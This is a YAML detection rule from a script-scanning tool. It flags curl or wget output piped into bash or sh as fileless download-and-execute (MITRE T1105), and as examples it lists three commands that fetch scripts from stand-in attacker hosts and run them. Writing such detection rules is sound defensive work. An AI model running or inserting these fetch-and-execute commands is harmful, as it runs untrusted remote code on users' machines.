# Bash Pattern: Curl/Wget Download and Execute
# Detects download and execute patterns

id: BASH-002
name: Curl/Wget Download and Execute
description: |
  Detects patterns where curl or wget downloads content and pipes it directly to
  bash or sh for execution. This is a common technique for downloading and running
  malicious scripts without saving them to disk (fileless execution).
languages:
  - bash
detection_type: regex
detection_logic: '(?:curl|wget)\s*.*\|\s*(?:bash|sh|/bin/bash|/bin/sh)'
severity: High
mitre_technique: T1105
confidence: 0.9
category: command_injection
enabled: true
metadata:
  author: Script Sentinel Team
  created: "2025-01-15"
  references:
    - "https://attack.mitre.org/techniques/T1105/"
  tags:
    - bash
    - download
    - fileless
  examples:
    - "curl http://malicious.com/script.sh | bash"
    - "wget -qO- http://evil.com/payload.sh | sh"
    - "curl -s https://attacker.com/install.sh | /bin/bash"